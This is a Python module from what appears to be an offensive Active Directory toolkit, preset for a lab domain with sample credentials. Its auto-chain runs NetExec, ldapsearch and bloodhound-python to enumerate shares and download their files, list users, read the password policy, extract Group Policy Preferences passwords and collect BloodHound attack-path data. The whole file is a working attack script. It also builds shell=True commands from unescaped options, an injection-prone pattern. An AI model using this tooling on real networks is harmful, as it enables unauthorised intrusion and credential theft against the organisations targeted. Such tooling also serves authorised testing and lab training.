import subprocess
import os
import time
from colorama import Fore, Style, init
from core.module_base import ModuleBase
from modules.no_cred import no_cred

init()

class AuthenticatedEnum(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "authenticated_enum"
        self.options = {
            "ip": '192.168.56.11',
            "domain": 'north.sevenkingdoms.local',
            "username": 'hodor',
            "password": 'hodor',
            "auto_chain": True,
            "output_dir": "./enum_output"
        }
        self.actions = {
            "initial_enumeration": self.initial_enumeration,
            "run_auto_chain": self.run_auto_chain
        }

    def banner(self):
        print(Fore.CYAN + f"\n🔐 MODULE {self.name.upper()} 🔐" + Style.RESET_ALL)
        print(" Authenticated SMB share enumeration + userobjects + BloodHound.\n")

    def check_required(self):
        for key in ["ip", "username", "password"]:
            if not self.options.get(key):
                print(f"[-] Missing required option: {key}")
                return False
        return True

    def ensure_output_dir(self):
        output_dir = self.options["output_dir"]
        if not os.path.exists(output_dir):
            try:
                os.makedirs(output_dir)
                print(f"[+] Created output directory: {output_dir}")
            except Exception:
                output_dir = "."
        return output_dir

    def run_and_log(self, command, output_file=None):
        result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print(result.stderr)
        if output_file:
            with open(output_file, "w") as f:
                f.write(result.stdout + "\n" + result.stderr)
        return result

    def run_spider_plus(self, username, password):
        print('\n[+] Running spider_plus...')
        output_dir = self.ensure_output_dir()
        command = f'nxc smb {self.options["ip"]} -u {username} -p {password} -M spider_plus -o OUTPUT_FOLDER={output_dir}/spider_plus DOWNLOAD_FLAG=True'
        try:
            self.run_and_log(command, f"{output_dir}/spider_plus_result.txt")
            return True
        except Exception:
            return False

    def enumerate_smb_shares(self, username, password):
        print(f"\n[+] Checking SMB shares...")
        output_dir = self.ensure_output_dir()
        command = f'nxc smb {self.options["ip"]} -u {username} -p {password} --shares'
        try:
            self.run_and_log(command, f"{output_dir}/smb_shares.txt")
            return True
        except Exception:
            return False

    def enumerate_users(self, username, password):
        print(f"\n[+] Enumerating users...")
        output_dir = self.ensure_output_dir()
        command = f'nxc smb {self.options["ip"]} -u {username} -p {password} -M users'
        try:
            self.run_and_log(command, f"{output_dir}/users.txt")
            return True
        except Exception:
            return False

    def enumerate_user_objects(self, username, password):
        print(f"\n[+] Enumerating user objects...")
        output_dir = self.ensure_output_dir()
        ldap_command = f'ldapsearch -x -h {self.options["ip"]} -D "{username}@{self.options["domain"]}" -w "{password}" -b "DC={self.options["domain"].replace(".", ",DC=")}" "(objectClass=user)" sAMAccountName userPrincipalName description memberOf'
        alt_command = f'nxc ldap {self.options["ip"]} -u {username} -p {password} --users'
        try:
            self.run_and_log(ldap_command, f"{output_dir}/user_objects.txt")
            self.run_and_log(alt_command, f"{output_dir}/user_objects_alt.txt")
            return True
        except Exception:
            return False

    def run_domain_password_policy(self, username, password):
        print(f"\n[+] Getting password policy...")
        output_dir = self.ensure_output_dir()
        command = f'nxc smb {self.options["ip"]} -u {username} -p {password} --pass-pol'
        try:
            self.run_and_log(command, f"{output_dir}/password_policy.txt")
            return True
        except Exception:
            return False

    def run_group_policy(self, username, password):
        print(f"\n[+] Getting group policy...")
        output_dir = self.ensure_output_dir()
        command = f'nxc smb {self.options["ip"]} -u {username} -p {password} -M gpp_password'
        try:
            self.run_and_log(command, f"{output_dir}/group_policy.txt")
            return True
        except Exception:
            return False

    def run_bloodhound(self, username, password):
        print(f"\n[+] Running BloodHound...")
        output_dir = self.ensure_output_dir()
        files_before = set(os.listdir('.'))
        command = f"bloodhound-python -u {username} -p {password} -d {self.options['domain']} -ns {self.options['ip']} -c All --dns-tcp --zip"
        try:
            self.run_and_log(command)
            time.sleep(2)
            files_after = set(os.listdir('.'))
            new_files = files_after - files_before
            zip_files = [f for f in new_files if f.endswith('.zip')]
            if zip_files:
                zip_file = sorted(zip_files)[-1]
                new_path = os.path.join(output_dir, zip_file)
                os.rename(zip_file, new_path)
                return new_path
            return None
        except Exception:
            return None

    def initial_enumeration(self):
        if not self.check_required():
            return
        username = self.options["username"]
        password = self.options["password"]
        choice = input("""
[1] Enumerate SMB Shares
[2] Run Spider Plus
[3] Enumerate Users
[4] Get Domain Password Policy
[5] Check Group Policy
[6] Run BloodHound Collection
[7] Run All (Auto Chain)

Choice: """).strip()
        
        if choice == "1":
            self.enumerate_smb_shares(username, password)
        elif choice == "2":
            self.run_spider_plus(username, password)
        elif choice == "3":
            self.enumerate_users(username, password)
        elif choice == "4":
            self.run_domain_password_policy(username, password)
        elif choice == "5":
            self.run_group_policy(username, password)
        elif choice == "6":
            self.run_bloodhound(username, password)
        elif choice == "7":
            self.run_auto_chain()
        else:
            print("[-] Invalid choice")

    def run_auto_chain(self):
        if not self.check_required():
            return

        username = self.options["username"]
        password = self.options["password"]
        output_dir = self.ensure_output_dir()

        print(Fore.GREEN + "\n[+] Starting enumeration chain..." + Style.RESET_ALL)
        print(f"[+] Output directory: {output_dir}\n")

        report_file = f"{output_dir}/enumeration_report.txt"
        with open(report_file, "w") as f:
            f.write(f"Authenticated Enumeration Report\n")
            f.write(f"==============================\n")
            f.write(f"Target: {self.options['ip']}\n")
            f.write(f"Domain: {self.options['domain']}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        print(Fore.BLUE + "[*] Enumerating SMB Shares..." + Style.RESET_ALL)
        self.enumerate_smb_shares(username, password)
        print(Fore.GREEN + "[+] SMB share enumeration complete.\n" + Style.RESET_ALL)

        print(Fore.BLUE + "[*] Running Spider Plus..." + Style.RESET_ALL)
        self.run_spider_plus(username, password)
        print(Fore.GREEN + "[+] Spider Plus complete.\n" + Style.RESET_ALL)

        print(Fore.BLUE + "[*] Enumerating Users..." + Style.RESET_ALL)
        self.enumerate_users(username, password)
        print(Fore.GREEN + "[+] User enumeration complete.\n" + Style.RESET_ALL)

        print(Fore.BLUE + "[*] Enumerating Detailed User Objects..." + Style.RESET_ALL)
        self.enumerate_user_objects(username, password)
        print(Fore.GREEN + "[+] User object enumeration complete.\n" + Style.RESET_ALL)

        print(Fore.BLUE + "[*] Getting Password Policy..." + Style.RESET_ALL)
        self.run_domain_password_policy(username, password)
        print(Fore.GREEN + "[+] Password policy retrieval complete.\n" + Style.RESET_ALL)

        print(Fore.BLUE + "[*] Getting Group Policy Information..." + Style.RESET_ALL)
        self.run_group_policy(username, password)
        print(Fore.GREEN + "[+] Group policy retrieval complete.\n" + Style.RESET_ALL)

        print(Fore.BLUE + "[*] Running BloodHound Collection..." + Style.RESET_ALL)
        zip_file = self.run_bloodhound(username, password)
        if zip_file:
            print(Fore.GREEN + f"[+] BloodHound data collected: {zip_file}" + Style.RESET_ALL)
            print(Fore.YELLOW + "[i] You can now open this zip in BloodHound for graphical analysis.\n" + Style.RESET_ALL)
        else:
            print(Fore.RED + "[-] BloodHound zip file could not be created.\n" + Style.RESET_ALL)

        with open(report_file, "a") as f:
            f.write("\nEnumeration Summary\n")
            f.write("==================\n")
            f.write(f"SMB Shares: {output_dir}/smb_shares.txt\n")
            f.write(f"Spider Plus: {output_dir}/spider_plus_result.txt\n")
            f.write(f"Users: {output_dir}/users.txt\n")
            f.write(f"User Objects: {output_dir}/user_objects.txt\n")
            f.write(f"Password Policy: {output_dir}/password_policy.txt\n")
            f.write(f"Group Policy: {output_dir}/group_policy.txt\n")
            if zip_file:
                f.write(f"BloodHound Data: {zip_file}\n")

        print(Fore.GREEN + "\n[✔] Enumeration chain completed successfully!" + Style.RESET_ALL)
        print(f"[+] All output saved in: {output_dir}")
        if zip_file:
            print(Fore.YELLOW + f"[i] BloodHound ZIP file: {zip_file}\n[i] Import this into BloodHound for attack path analysis.\n" + Style.RESET_ALL)
